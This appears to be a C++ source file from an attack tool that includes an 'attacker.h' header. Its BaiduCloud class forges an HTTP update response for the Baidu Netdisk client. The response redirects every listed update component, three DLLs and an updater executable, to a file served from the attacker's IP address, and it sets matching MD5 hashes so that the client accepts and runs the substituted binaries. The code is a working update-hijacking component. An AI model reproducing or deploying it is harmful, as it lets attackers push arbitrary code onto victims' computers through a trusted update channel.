

#include "BaiduCloud.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "..\\SdkVersion.h"
#include "../HttpUtils.h"

using namespace std;


string BaiduCloud::getTypeName() {
	return "BAIDUCLOUD";
}







int BaiduCloud::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"	//Content-Type: text/html; charset=utf8\r\n
		"Connection: keep-alive\r\n\r\n%s";

	//issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernel/kernel.20013.gz
	char * lpRespContentFormat =
		"{\"version\":\"%s\",\r\n"
		"\"KUInfo\" : {\"name\":\"kernel.dll\",\"version\" : \"%s\","
		"\"url\" : \"http://%s/%s\",\"md5\":\"%s\"},\r\n"
		"\"k1info\" : {\"name\":\"kernelbasis.dll\",\"version\" : \"%s\","
		"\"url\" : \"http://%s/%s\",\"md5\":\"%s\"},\r\n"
		"\"k2info\" : {\"name\":\"kernelpromote.dll\",\"version\" : \"%s\","
		"\"url\" : \"http://%s/%s\",\"md5\":\"%s\"},\r\n"
		"\"kueinfo\": {\"name\":\"kernelUpdate.exe\",\"version\" : \"%s\","		
		"\"url\" : \"http://%s/%s\",\"md5\":\"%s\"} }\r\n";

	
	string totalver = "2.0.1.46";		//2.0.0.46
	string kernelver = "2.0.0.13";
	string basisver = "2.1.5.18";
	string promotever = "2.1.12.8";
	string updatever = "2.0.1.9";		//2.0.0.9

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,totalver.c_str(),
		kernelver.c_str(),szip.c_str(), filename.c_str(), m_szmd5,
		basisver.c_str(), szip.c_str(), filename.c_str(), m_szmd5,
		promotever.c_str(), szip.c_str(), filename.c_str(), m_szmd5,
		updatever.c_str(), szip.c_str(), filename.c_str(), m_szmd5
		);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}






